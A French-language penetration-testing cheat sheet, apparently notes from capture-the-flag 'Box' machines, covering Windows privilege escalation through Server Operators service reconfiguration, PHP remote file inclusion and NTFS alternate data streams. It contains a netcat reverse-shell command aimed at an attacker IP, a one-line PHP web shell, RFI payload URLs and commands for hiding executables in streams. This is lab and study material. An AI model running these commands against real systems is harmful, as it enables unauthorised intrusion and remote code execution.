# 10-Techniques Diverses d'Escalade de Privilèges

Cette section regroupe diverses techniques d'escalade de privilèges qui ne rentrent pas facilement dans les catégories précédentes, ainsi que des exemples spécifiques tirés de scénarios de type "Box".

## Exploitation des Groupes de Sécurité
L'appartenance à certains groupes peut accorder des privilèges permettant l'escalade.

**1. Énumération des Groupes**
```powershell
whoami /all
whoami /groups
net user VotreUtilisateur
Get-LocalGroupMember -Group "NomDuGroupe"
# Groupes d'intérêt : Administrators, Remote Desktop Users, Server Operators, Backup Operators, Print Operators, etc.
```

**2. Exploitation du Groupe "Server Operators" (Opérateurs de Serveur)**
Les membres de ce groupe peuvent démarrer et arrêter des services, et modifier la configuration de certains services.
Exemple (Return Box - `02-windows-user-privileges.md`) :
```bash
# Vérifier l'appartenance aux groupes
# whoami /all

# Si membre de "Server Operators" ou équivalent permettant de configurer des services :
# Configurer un service existant (ex: VMTools, Spooler, etc.) pour exécuter un payload
sc.exe config <NOM_SERVICE_CIBLE> binPath="C:\chemin\vers\nc.exe -e cmd.exe <IP_ATTAQUANT> <PORT>"
# Assurez-vous que le service peut être arrêté et démarré par vous, ou qu'il démarre automatiquement.
# Tenter d'arrêter et démarrer le service
sc.exe stop <NOM_SERVICE_CIBLE>
sc.exe start <NOM_SERVICE_CIBLE>
# Si le démarrage échoue ou si vous n'avez pas les droits, un redémarrage du système peut être nécessaire si le service est en auto-démarrage.
```
**Attention :** Modifier `binPath` pour des services système critiques peut déstabiliser le système. Ciblez des services tiers ou moins critiques si possible.

## Exploitation des Vulnérabilités d'Applications Web (Exemple RFI)
Bien que généralement associée au pentesting web, une vulnérabilité d'application web sur un serveur peut parfois mener à une exécution de code sur le serveur lui-même, potentiellement avec les privilèges du pool d'applications ou du service web.

**Exemple : Inclusion de Fichier à Distance (RFI) menant à l'exécution de code**
(Extrait de `03-other-stuff-not-finished.md` - Sniper Box)
Ce scénario suppose une vulnérabilité RFI dans une application PHP.

1.  **Configuration d'un partage SMB malveillant (ou d'un serveur web) sur la machine attaquante :**
    L'objectif est d'héberger un fichier PHP (ou autre, selon la RFI) qui sera inclus et exécuté par l'application web vulnérable.
    ```bash
    # Sur Kali, créer un fichier PHP simple (ex: box.php)
    # <?php system($_GET['cmd']); ?>
    # ou un reverse shell PHP

    # Partager via SMB (si la RFI supporte les chemins UNC \\attaquant\partage\box.php)
    # mkdir /var/www/html/sniper # (ou autre chemin pour smbserver)
    # sudo python3 /usr/share/impacket/examples/smbserver.py -smb2support sniper /var/www/html/sniper/
    # (Assurez-vous que les permissions permettent l'accès anonyme si nécessaire)

    # Ou héberger via HTTP (si la RFI supporte http://attaquant/box.php)
    # sudo cp box.php /var/www/html/
    # sudo systemctl start apache2
    ```

2.  **Exploitation de la RFI :**
    Supposons que l'application web ait une URL comme `http://<IP_CIBLE>/app/index.php?page=contact.php`.
    Si le paramètre `page` est vulnérable à la RFI :
    ```
    # Via SMB (si supporté et configuré)
    http://<IP_CIBLE>/app/index.php?page=\\<IP_ATTAQUANT>\sniper\box.php&cmd=whoami

    # Via HTTP
    http://<IP_CIBLE>/app/index.php?page=http://<IP_ATTAQUANT>/box.php&cmd=whoami
    ```
    Si l'inclusion réussit, la commande `whoami` (ou le code dans `box.php`) sera exécutée sur le serveur avec les privilèges du service web. L'escalade de privilèges locale peut ensuite être nécessaire.

## Flux de Données Alternatifs (ADS - Alternate Data Streams)
Les ADS permettent de stocker des données "cachées" attachées à des fichiers NTFS sans affecter leur taille ou fonctionnalité apparente. Ils peuvent être utilisés pour dissimuler des outils, des payloads, ou des informations volées.

**1. Lister les ADS**
```batch
dir /R C:\chemin\vers\repertoire
```
Un fichier avec un ADS affichera sa taille normale, puis `:$DATA` pour le flux principal, et d'autres flux comme `fichier.txt:nomduflux:$DATA`.

**2. Créer un ADS**
```batch
echo "Contenu secret" > fichier.txt:fluxcache.txt
type C:\Windows\System32\calc.exe > fichier.txt:calc.exe # Cacher un exécutable
```

**3. Lire un ADS**
```batch
more < fichier.txt:fluxcache.txt
notepad fichier.txt:fluxcache.txt
```

**4. Exécuter un exécutable depuis un ADS (plus complexe)**
L'exécution directe est difficile. Souvent, il faut d'abord extraire le contenu.
```batch
# Extraire (conceptuel, peut nécessiter des outils ou des scripts plus avancés)
type fichier.txt:calc.exe > calc_extrait.exe
# Ou utiliser des commandes PowerShell
Get-Content -Path fichier.txt -Stream calc.exe -AsByteStream | Set-Content -Path calc_extrait.exe -AsByteStream
# Puis exécuter calc_extrait.exe
```
Ou utiliser des LOLBAS qui peuvent interagir avec les ADS, si disponibles.

**Exemple (Jeeves Box - lire un ADS contenant des informations) :**
(Extrait de `03-other-stuff-not-finished.md`)
```bash
# Lister les flux
dir /R
# Lire le contenu d'un flux (supposons que hm.txt ait un flux nommé root.txt)
more < hm.txt:root.txt
```
Dans ce cas, l'ADS était utilisé pour stocker du texte (potentiellement des identifiants ou des notes). 